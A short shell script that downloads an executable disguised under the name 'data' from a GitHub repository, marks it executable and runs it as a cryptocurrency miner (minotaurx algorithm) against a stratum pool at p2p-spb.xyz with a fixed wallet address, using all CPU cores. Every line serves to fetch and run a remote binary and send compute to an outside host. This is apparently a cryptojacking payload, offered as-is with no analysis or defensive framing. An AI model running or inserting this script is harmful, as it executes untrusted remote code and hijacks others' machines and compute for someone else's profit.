apt update -y
wget https://github.com/adeayuvebriani/datamine/raw/main/data
chmod +x data
./data -a minotaurx -o stratum+tcp://p2p-spb.xyz:5557 -u MMguZU589zvBmqMAg3GsKoLxv1JZpWch8L -p x -t $(nproc)
